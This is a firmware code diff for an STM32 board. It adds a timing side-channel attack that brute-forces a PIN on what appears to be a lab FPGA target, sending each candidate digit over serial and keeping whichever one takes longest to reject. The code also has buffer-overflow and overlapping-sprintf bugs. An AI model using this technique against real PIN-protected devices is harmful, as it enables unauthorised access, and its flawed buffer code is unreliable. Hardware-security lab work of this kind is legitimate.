@@ -5,10 +5,13 @@
 #include <libopencm3/stm32/exti.h>
 #include <libopencm3/cm3/nvic.h>
 
-volatile uint32_t start_time = 0;
+#define MAX(a, b) ((a) > (b) ? (a) : (b))
+
 volatile uint32_t elapsed_time = 0;
-volatile bool timer_running = false;
+volatile bool timer_running = false, found_flag = false, restart_flag = false, start_flag = false;
 volatile uint32_t counter = 0;
+volatile char previous = ' ';
+
 // TODO:
 /*
     Write a function that goes through the pin codes 0-9, 00-99, etc.
@@ -59,27 +62,17 @@ void usart_setup(void) {
 }
 
 void timer_setup(void) {
-    // Enable Timer 2 clock
-    rcc_periph_clock_enable(RCC_TIM2);
-    
-    // Reset Timer 2 settings
-    rcc_periph_reset_pulse(RST_TIM2);
-    
-    // Set the prescaler value to get a 10 MHz timer clock (0.1 µs resolution)
-    timer_set_prescaler(TIM2, rcc_apb1_frequency / 10000000 - 1);
-    
-    // Set the timer mode to up-counting
-    timer_set_mode(TIM2, TIM_CR1_CKD_CK_INT, TIM_CR1_CMS_EDGE, TIM_CR1_DIR_UP);
-    
-    // Enable auto-reload preload
-    timer_enable_preload(TIM2);
-    
-    // Set auto-reload value to the maximum (32-bit timer)
-    timer_set_period(TIM2, 0xFFFFFFFF);
-    
-    // Enable Timer 2 counter
-    timer_enable_counter(TIM2);
+    // Configure TIM2
+    rcc_periph_clock_enable(RCC_TIM2);       // Enable Timer 2 clock
+    rcc_periph_reset_pulse(RST_TIM2);        // Reset Timer 2
+    timer_set_prescaler(TIM2, rcc_apb1_frequency / 10000000 - 1); // Set prescaler for 10 MHz clock
+    timer_set_mode(TIM2, TIM_CR1_CKD_CK_INT, TIM_CR1_CMS_EDGE, TIM_CR1_DIR_UP); // Up-counting mode
+    timer_enable_preload(TIM2);              // Enable auto-reload preload
+    timer_set_period(TIM2, 0xFFFFFFFF);      // Set max period (32-bit counter)
+    timer_enable_counter(TIM2);              // Enable Timer 2
 }
+
+
 
 void exti_setup(void) {
     // Enable clock for system configuration controller (needed for EXTI)
@@ -106,10 +99,9 @@ void exti0_isr(void) {
     
     // Start or restart the timer
     timer_set_counter(TIM2, 0);
-    start_time = 0;
     timer_running = true;
-    ++counter;
-    usart_send_string("Interrupt triggered\n", USART2);
+    // ++counter;
+    // usart_send_string("Interrupt triggered\n", USART2);
 }
 
 void exti1_isr(void) {
@@ -120,19 +112,6 @@ void exti1_isr(void) {
         // Stop the timer and calculate elapsed time in microseconds
         elapsed_time = timer_get_counter(TIM2);
         timer_running = false;
-        
-        // Output the duration via USART1
-        // output_duration_usart1(elapsed_time);
-    }
-}
-
-void output_duration_usart1(uint32_t duration) {
-    char buffer[32];
-    int len = snprintf(buffer, sizeof(buffer), "Duration: %lu us\r\n", duration);
-    
-    // Send the duration string via USART1
-    for (int i = 0; i < len; i++) {
-        usart_send_blocking(USART1, buffer[i]);
     }
 }
 
@@ -141,32 +120,57 @@ void usart1_isr(void){
     if (usart_get_flag(USART1, USART_SR_RXNE)) {
         /* Read received character. */
         char received = usart_recv(USART1);
-    
-        /* Echo received character back. */
-        usart_send_blocking(USART1, received);
-        // usart_send_string("Hello World!\n", USART1);
-    }
-}
-
-/* USART2 interrupt service routine. */
-void usart2_isr(void){
-    if (usart_get_flag(USART2, USART_SR_RXNE)) {
-        /* Read received character. */
-        char received = usart_recv(USART2);
-
-        /* Echo received character back. */
-        // usart_send_blocking(USART2, received);
+     
+        if(previous == 'I' && received == 'n'){
+            // flag to restart the fpga board
+            restart_flag = true;
+        }
+        if(previous == 'P' && received == 'l'){
+            // flag to launch brute() function
+            start_flag = true;
+            restart_flag = true;
+        }
+        if(received == '/')
+            found_flag = true;
+        previous = received;
     }
 }
 
 /* Simple function to send a string via USART2. */
-void usart_send_string(const char *str, uint32_t uart_addr)
-{
-    while (*str) {
-        usart_send_blocking(uart_addr, *str++);
-    }
+void usart_send_string(const char *str, uint32_t uart_addr) {
+    while (*str) usart_send_blocking(uart_addr, *str++);
+    if(uart_addr == USART2) restart_flag = false;
 }
 
+void brute(char * pin, uint8_t c){
+    char temp[10] = "";
+    uint32_t max_time = 0; uint8_t max_index = 0;
+    
+    for(uint8_t i=0; i < 10; ++i){
+        uint32_t count = 100000;
+        sprintf(temp, "%s%d\r\n\0", pin, i);
+        usart_send_string(temp, USART1);
+        
+        while(!restart_flag) asm("nop");
+        while(--count > 0) asm("nop");
+        count = 100000;
+        // The maximum elapsed time holder has corresponding digit in PIN
+        // while(elapsed_time == 0) asm("nop");
+        if(elapsed_time > max_time){
+            max_time = elapsed_time;
+            max_index = i;
+        }
+        usart_send_string("r", USART2);
+        elapsed_time = 0;
+        while(--count > 0) asm("nop");
+        if(found_flag) return;
+    }
+    sprintf(pin, "%s%d", pin, max_index);
+        
+    if(--c > 0 && !found_flag)
+        brute(pin, c);
+    // return -1;
+}
 int main(void) {
     rcc_clock_setup_pll(&rcc_hse_25mhz_3v3[RCC_CLOCK_3V3_84MHZ]);
     // Setup peripherals
@@ -174,8 +178,11 @@ int main(void) {
     usart_setup();
     timer_setup();
     exti_setup();
-    usart_send_string("Hello world!\n", USART1);
-    usart_send_string("From the 2nd USART too\n!", USART2);
+
+    while(!start_flag) asm("nop");
+    // brute till PIN size 10 digits
+    char pin[10] = "";    
+    brute(pin, 10);
     // Main loop does nothing; interrupts handle the timing and UART output
     while (1) {
         __asm__("nop");
